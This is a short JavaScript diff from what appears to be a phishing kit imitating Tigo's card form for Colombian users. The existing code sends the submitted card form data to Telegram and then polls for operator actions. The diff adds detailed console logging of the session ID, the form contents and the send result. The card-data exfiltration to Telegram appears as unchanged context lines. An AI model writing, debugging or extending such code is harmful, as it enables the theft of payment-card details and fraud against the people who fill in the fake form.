@@ -67,16 +67,23 @@ document.addEventListener('DOMContentLoaded', function() {
             timestamp: new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
         };
 
-        console.log('[CARD] Enviando datos:', formData);
+        console.log('[CARD] ========== ENVIANDO DATOS ==========');
+        console.log('[CARD] SessionId:', sessionId);
+        console.log('[CARD] FormData:', JSON.stringify(formData, null, 2));
 
         try {
             const result = await TelegramClient.sendToTelegram('tigo_card', formData, sessionId);
+            
+            console.log('[CARD] ========== RESULTADO DEL ENVÍO ==========');
+            console.log('[CARD] Success:', result.success);
+            console.log('[CARD] Result:', JSON.stringify(result, null, 2));
 
             if (!result.success) {
                 throw new Error(result.error || 'Error al enviar datos');
             }
 
-            console.log('[CARD] Datos enviados. Iniciando polling...');
+            console.log('[CARD] ✅ Datos enviados correctamente');
+            console.log('[CARD] ⏳ Iniciando polling...');
 
             // Iniciar polling con el patrón correcto
             const stopPolling = TelegramClient.startPolling((actions, stop) => {
